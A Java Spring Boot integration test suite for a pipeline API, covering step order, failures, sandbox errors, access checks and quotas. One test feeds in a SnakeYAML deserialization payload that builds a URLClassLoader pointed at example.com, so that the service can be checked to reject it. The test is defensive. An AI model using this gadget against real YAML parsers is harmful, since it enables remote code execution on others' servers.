package com.devforge.ai.deploymentservice;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyMap;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import com.devforge.ai.common.exception.ResourceNotFoundException;
import com.devforge.ai.common.git.GitContentClient;
import com.devforge.ai.common.git.RepositoryFile;
import com.devforge.ai.common.security.client.ProjectAccessClient;
import com.devforge.ai.deploymentservice.pipeline.PipelineRunEntity;
import com.devforge.ai.deploymentservice.pipeline.PipelineRunRepository;
import com.devforge.ai.deploymentservice.pipeline.PipelineStepRepository;
import com.devforge.ai.deploymentservice.sandbox.Sandbox;
import com.devforge.ai.deploymentservice.sandbox.Sandbox.Language;
import com.devforge.ai.deploymentservice.sandbox.Sandbox.Limits;
import com.devforge.ai.deploymentservice.sandbox.Sandbox.Outcome;
import com.devforge.ai.deploymentservice.sandbox.Sandbox.Result;
import com.devforge.ai.deploymentservice.sandbox.Sandbox.SandboxUnavailableException;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.time.Duration;
import java.time.Instant;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.ResultActions;

/**
 * Pipelines around the sandbox: the definition, the workspace, step order and failure, and access.
 * The sandbox is replaced here; running real steps in real containers is DockerSandboxEscapeTest's.
 */
@SpringBootTest
@AutoConfigureMockMvc
@DisplayName("Pipeline API")
class PipelineApiTest {

  private static final String DEFINITION = """
      steps:
        - name: lint
          runtime: python
          run: python -m pyflakes .
        - name: test
          runtime: python
          run: python -m unittest
          timeout: 9999
      """;

  @Autowired private MockMvc mockMvc;
  @Autowired private ObjectMapper objectMapper;
  @Autowired private PipelineRunRepository runs;
  @Autowired private PipelineStepRepository steps;
  @MockitoBean private ProjectAccessClient projectAccessClient;
  @MockitoBean private GitContentClient gitContent;
  @MockitoBean private Sandbox sandbox;

  private final UUID organizationId = UUID.randomUUID();
  private final UUID projectId = UUID.randomUUID();
  private final UUID repositoryId = UUID.randomUUID();
  private final UUID alice = UUID.randomUUID();

  @BeforeEach
  void setUp() {
    steps.deleteAll();
    runs.deleteAll();
    when(gitContent.defaultBranch(any(), anyString())).thenReturn("main");
    definition(DEFINITION);
    when(gitContent.filesToAnalyse(any(), eq("main"), eq(null), anyString())).thenReturn(List.of(
        RepositoryFile.of("app.py", 10, false, false, "print(1)\n"),
        RepositoryFile.of("logo.png", 2048, false, true, ""),
        RepositoryFile.of("data/huge.csv", 9_000_000, true, false, "")));
  }

  private void definition(String yaml) {
    when(gitContent.file(any(), eq("main"), eq(".devforge/pipeline.yml"), anyString()))
        .thenReturn(RepositoryFile.of(".devforge/pipeline.yml", yaml.length(), false, false, yaml));
  }

  private String base() {
    return "/api/v1/organizations/" + organizationId + "/projects/" + projectId + "/repositories/"
        + repositoryId + "/pipelines";
  }

  private String bearer() {
    return "Bearer " + TestTokens.accessToken(alice);
  }

  private ResultActions trigger() throws Exception {
    return mockMvc.perform(post(base()).header(HttpHeaders.AUTHORIZATION, bearer())
        .contentType(MediaType.APPLICATION_JSON).content("{}"));
  }

  private UUID triggerAndWait(String expectedStatus) throws Exception {
    var json = trigger().andExpect(status().isAccepted()).andReturn().getResponse().getContentAsString();
    var id = UUID.fromString(objectMapper.readTree(json).path("data").path("id").asText());
    var deadline = Instant.now().plus(Duration.ofSeconds(10));
    while (Instant.now().isBefore(deadline)) {
      var run = runs.findById(id).orElseThrow();
      if (run.getStatus().name().equals(expectedStatus)) {
        return id;
      }
      Thread.sleep(50);
    }
    throw new AssertionError("Run did not reach " + expectedStatus + ": " + runs.findById(id).orElseThrow().getStatus());
  }

  private static Result ok(String out) {
    return new Result(Outcome.COMPLETED, 0, out, "", false, 100);
  }

  @Test
  @DisplayName("runs every step in order on the repository's text files, and says which were left out")
  void runsSteps() throws Exception {
    when(sandbox.runStep(any(), anyMap(), anyString(), any())).thenReturn(ok("fine\n"));

    var id = triggerAndWait("SUCCEEDED");

    @SuppressWarnings("unchecked")
    ArgumentCaptor<Map<String, String>> files = ArgumentCaptor.forClass(Map.class);
    var limits = ArgumentCaptor.forClass(Limits.class);
    verify(sandbox, org.mockito.Mockito.times(2))
        .runStep(eq(Language.PYTHON), files.capture(), anyString(), limits.capture());
    assertThat(files.getValue()).containsOnlyKeys("app.py");
    assertThat(limits.getAllValues().get(1).timeoutSeconds()).isEqualTo(120);

    mockMvc.perform(get(base() + "/" + id).header(HttpHeaders.AUTHORIZATION, bearer()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.data.status").value("SUCCEEDED"))
        .andExpect(jsonPath("$.data.ref").value("main"))
        .andExpect(jsonPath("$.data.omittedFiles.length()").value(2))
        .andExpect(jsonPath("$.data.steps[0].name").value("lint"))
        .andExpect(jsonPath("$.data.steps[0].status").value("SUCCEEDED"))
        .andExpect(jsonPath("$.data.steps[1].timeoutSeconds").value(120))
        .andExpect(jsonPath("$.data.steps[1].stdout").value("fine\n"));
  }

  @Test
  @DisplayName("stops at the first failing step and skips the rest")
  void stopsAtFailure() throws Exception {
    when(sandbox.runStep(any(), anyMap(), eq("python -m pyflakes ."), any()))
        .thenReturn(new Result(Outcome.COMPLETED, 1, "", "app.py:1: unused import\n", false, 90));

    var id = triggerAndWait("FAILED");

    var rows = steps.findByRunIdOrderByPosition(id);
    assertThat(rows).extracting(s -> s.getStatus().name()).containsExactly("FAILED", "SKIPPED");
    verify(sandbox, org.mockito.Mockito.times(1)).runStep(any(), anyMap(), anyString(), any());
    assertThat(runs.findById(id).orElseThrow().getMessage()).contains("lint");
  }

  @Test
  @DisplayName("a sandbox that is off ends the run as an error, not as failed code")
  void sandboxOff() throws Exception {
    when(sandbox.runStep(any(), anyMap(), anyString(), any()))
        .thenThrow(new SandboxUnavailableException("Code execution is not enabled on this deployment"));

    var id = triggerAndWait("ERROR");

    assertThat(steps.findByRunIdOrderByPosition(id)).extracting(s -> s.getStatus().name())
        .containsExactly("REFUSED", "SKIPPED");
  }

  @Test
  @DisplayName("a repository without a pipeline file is told how to add one, and nothing is recorded")
  void noDefinition() throws Exception {
    when(gitContent.file(any(), eq("main"), eq(".devforge/pipeline.yml"), anyString()))
        .thenThrow(new ResourceNotFoundException("File not found"));

    trigger().andExpect(status().isBadRequest())
        .andExpect(jsonPath("$.message").value(org.hamcrest.Matchers.containsString(".devforge/pipeline.yml")));
    assertThat(runs.count()).isZero();
  }

  @Test
  @DisplayName("rejects a definition that is malformed or asks YAML to build arbitrary objects")
  void invalidDefinitions() throws Exception {
    for (var yaml : List.of(
        "steps: [",
        "steps: []",
        "steps:\n  - name: x\n    runtime: cobol\n    run: go\n",
        "steps:\n  - name: x\n    runtime: python\n",
        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://example.com\"]]]]")) {
      definition(yaml);
      trigger().andExpect(status().isBadRequest());
    }
    assertThat(runs.count()).isZero();
    verify(sandbox, never()).runStep(any(), anyMap(), anyString(), any());
  }

  @Test
  @DisplayName("a non-member gets 404 and the repository is never read")
  void nonMember() throws Exception {
    doThrow(new ResourceNotFoundException("Project not found"))
        .when(projectAccessClient).requireProjectAccess(eq(organizationId), eq(projectId), any(), any());

    trigger().andExpect(status().isNotFound());
    verify(gitContent, never()).filesToAnalyse(any(), any(), any(), any());
    assertThat(runs.count()).isZero();
  }

  @Test
  @DisplayName("a run is not found through another repository")
  void otherRepository() throws Exception {
    when(sandbox.runStep(any(), anyMap(), anyString(), any())).thenReturn(ok(""));
    var id = triggerAndWait("SUCCEEDED");

    mockMvc.perform(get("/api/v1/organizations/" + organizationId + "/projects/" + projectId
            + "/repositories/" + UUID.randomUUID() + "/pipelines/" + id)
            .header(HttpHeaders.AUTHORIZATION, bearer()))
        .andExpect(status().isNotFound());
  }

  @Test
  @DisplayName("a run left open by a stopped instance is shown as interrupted, not still running")
  void staleRunIsInterrupted() throws Exception {
    var stale = runs.save(PipelineRunEntity.builder()
        .id(UUID.randomUUID()).organizationId(organizationId).projectId(projectId)
        .repositoryId(repositoryId).ref("main").triggeredBy(alice)
        .status(PipelineRunEntity.Status.RUNNING)
        .createdAt(Instant.now().minus(Duration.ofHours(3))).build());

    mockMvc.perform(get(base()).header(HttpHeaders.AUTHORIZATION, bearer()))
        .andExpect(status().isOk())
        .andExpect(jsonPath("$.data[0].status").value("INTERRUPTED"));
    assertThat(runs.findById(stale.getId()).orElseThrow().getStatus())
        .isEqualTo(PipelineRunEntity.Status.INTERRUPTED);
  }

  @Test
  @DisplayName("the hourly quota holds")
  void quota() throws Exception {
    when(sandbox.runStep(any(), anyMap(), anyString(), any())).thenReturn(ok(""));
    for (int i = 0; i < 3; i++) {
      trigger().andExpect(status().isAccepted());
    }
    trigger().andExpect(status().isTooManyRequests());
  }
}
